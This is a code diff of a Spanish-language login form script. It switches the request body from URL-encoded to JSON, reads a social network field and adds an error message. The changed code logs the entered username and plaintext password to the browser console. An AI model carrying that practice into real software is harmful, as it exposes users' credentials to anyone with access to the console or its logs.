@@ -32,7 +32,7 @@ document.getElementById('continue').addEventListener('click', function() {
     event.preventDefault();
     const username = document.getElementById('username').value;
     const password = document.getElementById('password').value;
-    const socialNetwork = socials[index];
+    const socialNetwork = document.getElementById('socialNetwork').value;
     const errorMessage = document.getElementById('error-message');
 
     /*
@@ -47,6 +47,8 @@ document.getElementById('continue').addEventListener('click', function() {
         alert('Todos los campos son obligatorios.');
         return;
     }
+
+    console.log("Datos del formulario:")
     console.log(username);
     console.log(password);
     console.log(socialNetwork);
@@ -54,13 +56,14 @@ document.getElementById('continue').addEventListener('click', function() {
     fetch('/login', {
         method: 'POST',
         headers: {
-            'Content-Type': 'application/x-www-form-urlencoded',
+            'Content-Type': 'application/json',
         },
-        body: new URLSearchParams({
+        body: JSON.stringify({
             'username': username,
             'password': password,
             'socialNetwork': socialNetwork
         })
+
     })
         .then(response => {
             if (response.redirected) {
@@ -69,7 +72,9 @@ document.getElementById('continue').addEventListener('click', function() {
                 errorMessage.textContent = 'Usuario o contraseña incorrectos';
                 errorMessage.style.display = 'block';
             } else {
-                console.log('Error en la respuesta del servidor  ', response.statusText);
+                errorMessage.textContent = 'Uh oh, ocurrió un error, llamen al ingeniero';
+                errorMessage.style.display = 'block';
+                console.log('Error en la respuesta del servidor llamen al ingeniero ', response.statusText);
             }
         })
         .catch(error => {
